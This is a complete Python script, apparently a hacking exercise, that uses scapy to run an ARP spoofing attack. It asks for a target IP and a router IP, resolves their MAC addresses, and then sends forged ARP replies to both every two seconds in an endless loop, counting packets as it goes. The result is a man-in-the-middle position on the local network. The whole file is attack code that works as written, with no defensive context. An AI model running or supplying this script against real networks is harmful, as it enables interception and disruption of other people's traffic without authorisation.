#!/usr/bin/env python
import scapy.all as scapy
import time

TARGET_CLIENT = input("Enter the target IP address: \n")
ROUTER = input("Enter the router IP address: \n")

#Takes in an IP address, sends out an ARP request and returns the client's MAC address
def parse_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_req = broadcast / arp_request
    answered = scapy.srp(broadcast_arp_req, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

#Sends an ARP response packet to a target using a spoof IP.
def spoof(target_ip, spoof_ip):
    target_mac = parse_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #op=2 for ARP response (op=1 for request)
    scapy.send(packet, verbose=False)

#Loop for maintaining the ARP poisoning, with a counter for # of packets sent
packets_sent = 0
while True:
    spoof(TARGET_CLIENT, ROUTER)
    spoof(ROUTER, TARGET_CLIENT)
    packets_sent += 2
    print(f"\r[+] Packets sent: {packets_sent}", end="")
    time.sleep(2)

